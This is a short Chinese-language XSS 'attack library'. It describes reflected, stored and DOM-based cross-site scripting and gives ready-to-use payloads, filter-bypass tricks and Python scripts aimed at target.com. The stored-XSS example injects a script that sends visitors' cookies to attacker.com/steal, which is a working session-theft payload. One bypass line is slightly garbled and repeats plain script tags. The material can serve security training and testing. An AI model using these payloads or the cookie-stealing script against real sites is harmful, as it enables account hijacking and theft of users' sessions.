# XSS攻击库

## 漏洞描述

跨站脚本攻击（XSS）允许攻击者在受害者的浏览器中执行恶意JavaScript代码。

## 类型

1. **反射型XSS**：恶意脚本通过URL参数注入，立即执行
2. **存储型XSS**：恶意脚本存储在服务器，每次访问时执行
3. **DOM型XSS**：通过修改DOM环境执行

## 检测方法

1. **基础测试**：`<script>alert(1)</script>`
2. **事件处理器**：`<img src=x onerror=alert(1)>`
3. **JavaScript伪协议**：`javascript:alert(1)`
4. **编码绕过**：HTML实体编码、URL编码

## 利用示例

### 案例1: 基础反射型XSS

```python
import requests

url = "http://target.com/search"
payload = "<script>alert('XSS')</script>"
response = requests.get(url, params={"q": payload})
# 检查响应中是否包含未转义的payload
```

### 案例2: 存储型XSS

```python
import requests

url = "http://target.com/comment"
payload = "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"

session = requests.Session()
session.post(url, data={"comment": payload})
# 当其他用户查看评论时，cookie会被发送到攻击者服务器
```

### 案例3: DOM型XSS

```python
# 如果页面使用 location.hash 或 document.write
payload = "#<img src=x onerror=alert(1)>"
url = f"http://target.com/page{payload}"
```

## 绕过技巧

1. **标签绕过**：`<img>`, `<svg>`, `<iframe>`, `<body>`
2. **事件绕过**：`onerror`, `onload`, `onclick`, `onmouseover`
3. **编码绕过**：HTML实体、URL编码、Unicode编码
4. **过滤器绕过**：`<ScRiPt>`, `<script>`, `<script>`

